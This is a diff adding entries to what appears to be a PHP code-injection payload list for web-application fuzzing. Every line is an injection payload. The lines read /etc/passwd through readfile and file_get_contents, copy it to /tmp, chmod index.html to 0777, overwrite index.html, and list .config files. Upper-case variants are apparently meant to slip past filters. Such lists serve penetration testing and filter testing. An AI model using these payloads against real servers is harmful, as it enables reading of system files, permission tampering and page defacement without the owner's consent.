@@ -22,3 +22,26 @@ print_r($_POST);system('id')
 PRINT_R($_POST);SYSTEM('id')
 system('cat /etc/passwd');
 ;system('cat /etc/passwd')
+readfile("/etc/passwd");
+readfile("index.html");
+READFILE("index.html")
+READFILE("/etc/passwd")
+echo%20file_exists("index.html");
+echo%20file_exists("/etc/passwd");
+ECHO%20FILE_EXISTS("index.html");
+ECHO%20FILE_EXISTS("/etc/passwd");
+chmod("index.html",0777);
+CHMOD("index.html",0777);
+echo%20copy("/etc/passwd","/tmp/passwd");
+echo%20file_exists("/tmp/passwd");
+echo%20file_get_contents("/etc/passwd");
+ECHO%20FILE_GET_CONTENTS("/etc/passwd");
+echo%20file_put_contents("index.html","Hello%20World.%20Testing!");
+ECHO%20FILE_PUT_CONTENTS("index.html","HELLO%20WORLD.%20TESTING!");
+echo%20fileperms("index.html");
+echo%20fileperms("/etc/passwd");
+ECHO%20FILEPERMS("index.html");
+ECHO%20FILEPERMS("/etc/passwd");
+print_r(glob("*.txt"));
+print_r(glob("*.html"));
+print_r(glob("*.config"));
